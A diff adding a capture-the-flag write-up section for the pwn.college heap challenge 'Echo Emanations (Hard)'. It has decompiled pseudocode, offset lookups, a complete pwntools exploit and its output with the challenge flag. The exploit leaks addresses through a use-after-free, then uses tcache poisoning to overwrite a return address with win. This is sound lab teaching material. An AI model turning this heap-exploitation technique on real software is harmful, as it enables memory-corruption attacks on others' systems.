@@ -5865,3 +5865,234 @@ hacker@dynamic-allocator-misuse~echo-emanations-easy:/$ python ~/script.py
 You win! Here is your flag:
 pwn.college{oltNDhu89yFosTi_YN8r9ALBFq8.0VM5MDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Echo Emanations (Hard)
+
+```
+hacker@dynamic-allocator-misuse~echo-emanations-hard:/$ /challenge/echo-emanations-hard
+###
+### Welcome to /challenge/echo-emanations-hard!
+###
+
+
+[*] Function (malloc/free/echo/scanf/quit):
+```
+
+The solution is the same as the [easy version](#echo-emanations-easy). The only differences are that there is no `print_tcache` display, and we have to find the file offset of `"/bin/echo"` and the address of `win` from the binary ourselves.
+
+### Binary Analysis
+
+```c title="/challenge/echo-emanations-hard :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  unsigned int v5; // [rsp+2Ch] [rbp-124h]
+  unsigned int v6; // [rsp+2Ch] [rbp-124h]
+  unsigned int v7; // [rsp+2Ch] [rbp-124h]
+  unsigned int v8; // [rsp+2Ch] [rbp-124h]
+  unsigned int v9; // [rsp+30h] [rbp-120h]
+  unsigned int size; // [rsp+34h] [rbp-11Ch]
+  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
+  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
+  unsigned __int64 v13; // [rsp+148h] [rbp-8h]
+
+  v13 = __readfsqword(0x28u);
+  setvbuf(stdin, nullptr, 2, 0);
+  setvbuf(stdout, nullptr, 2, 1u);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          puts(byte_2132);
+          printf("[*] Function (malloc/free/echo/scanf/quit): ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_2132);
+          if ( strcmp(s1, "malloc") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_2132);
+          v5 = atoi(s1);
+          if ( v5 > 0xF )
+            __assert_fail("allocation_index < 16", "<stdin>", 0x6Eu, "main");
+          printf("Size: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_2132);
+          size = atoi(s1);
+          ptr[v5] = malloc(size);
+        }
+        if ( strcmp(s1, "free") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", s1);
+        puts(byte_2132);
+        v6 = atoi(s1);
+        if ( v6 > 0xF )
+          __assert_fail("allocation_index < 16", "<stdin>", 0x7Eu, "main");
+        free(ptr[v6]);
+      }
+      if ( strcmp(s1, "echo") )
+        break;
+      printf("Index: ");
+      __isoc99_scanf("%127s", s1);
+      puts(byte_2132);
+      v7 = atoi(s1);
+      if ( v7 > 0xF )
+        __assert_fail("allocation_index < 16", "<stdin>", 0x8Au, "main");
+      printf("Offset: ");
+      __isoc99_scanf("%127s", s1);
+      puts(byte_2132);
+      v9 = atoi(s1);
+      echo(ptr[v7], v9);
+    }
+    if ( strcmp(s1, "scanf") )
+      break;
+    printf("Index: ");
+    __isoc99_scanf("%127s", s1);
+    puts(byte_2132);
+    v8 = atoi(s1);
+    if ( v8 > 0xF )
+      __assert_fail("allocation_index < 16", "<stdin>", 0x9Au, "main");
+    v3 = malloc_usable_size(ptr[v8]);
+    sprintf(s1, "%%%us", v3);
+    __isoc99_scanf(s1, ptr[v8]);
+    puts(byte_2132);
+  }
+  if ( strcmp(s1, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+```c title="/challenge/echo-emanations-hard :: echo() :: Pseudocode" showLineNumbers
+unsigned __int64 __fastcall echo(__int64 a1, __int64 a2)
+{
+  char **argv; // [rsp+18h] [rbp-18h]
+  char v4[6]; // [rsp+22h] [rbp-Eh] BYREF
+  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  strcpy(v4, "Data:");
+  argv = (char **)malloc(0x20u);
+  *argv = "/bin/echo";
+  argv[1] = v4;
+  argv[2] = (char *)(a1 + a2);
+  argv[3] = nullptr;
+  if ( !fork() )
+  {
+    execve(*argv, argv, nullptr);
+    exit(0);
+  }
+  wait(0);
+  return __readfsqword(0x28u) ^ v5;
+}
+```
+
+```
+hacker@dynamic-allocator-misuse~echo-emanations-hard:/$ python3 -c "
+data = open('/challenge/echo-emanations-hard', 'rb').read()
+print(hex(data.find(b'/bin/echo')))
+"
+# 0x2110
+```
+
+```
+hacker@dynamic-allocator-misuse~echo-emanations-hard:/$ nm /challenge/echo-emanations-hard | grep -E "main|win"
+# 00000000000016ce T main
+# 0000000000001500 T win
+```
+
+The `echo` function is identical to the easy version and `ptr` sits at the same stack offset `[rbp-0x110]` in both binaries, so the offset between `v4` and main's return address remains `0x176`.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/echo-emanations-hard")
+
+p.recvuntil(b"quit): ")
+
+def malloc(idx, size):
+    p.sendline(b"malloc")
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+    p.recvuntil(b"quit): ")
+
+def free(idx):
+    p.sendline(b"free")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"quit): ")
+
+def echo(idx, offset):
+    p.sendline(b"echo")
+    p.sendline(str(idx).encode())
+    p.sendline(str(offset).encode())
+    p.recvuntil(b"Data: ")
+    data = p.recvuntil(b"\n", drop=True)
+    p.recvuntil(b"quit): ")
+    return data
+
+def scanf(idx, data):
+    p.sendline(b"scanf")
+    p.sendline(str(idx).encode())
+    p.sendline(data)
+    p.recvuntil(b"quit): ")
+
+malloc(0, 32)
+free(0)
+echo(0, 0)
+
+bin_leak   = echo(0, 0).ljust(8, b"\x00")[:8]
+stack_leak = echo(0, 8).ljust(8, b"\x00")[:8]
+
+bin_addr   = u64(bin_leak)
+stack_addr = u64(stack_leak)
+
+base     = bin_addr - 0x2110
+win_addr = base + 0x1500
+ret_addr = stack_addr + 0x176
+
+print(f"[*] bin leak:   {hex(bin_addr)}")
+print(f"[*] stack leak: {hex(stack_addr)}")
+print(f"[*] base:       {hex(base)}")
+print(f"[*] win:        {hex(win_addr)}")
+print(f"[*] ret:        {hex(ret_addr)}")
+
+malloc(0, 128)
+malloc(1, 128)
+free(1)
+free(0)
+scanf(0, p64(ret_addr))
+malloc(0, 128)
+malloc(1, 128)
+scanf(1, p64(win_addr))
+
+p.sendline(b"quit")
+print(p.recvall().decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~echo-emanations-hard:/$ python ~/script.py
+[*] bin leak:   0x5851ffb97110
+[*] stack leak: 0x7ffc59d84042
+[*] base:       0x5851ffb95000
+[*] win:        0x5851ffb96500
+[*] ret:        0x7ffc59d841b8
+
+### Goodbye!
+You win! Here is your flag:
+pwn.college{0TBO3SAF54zAWFKEBdJ_Tlj0I3C.0lM5MDL4ITM0EzW}
+```
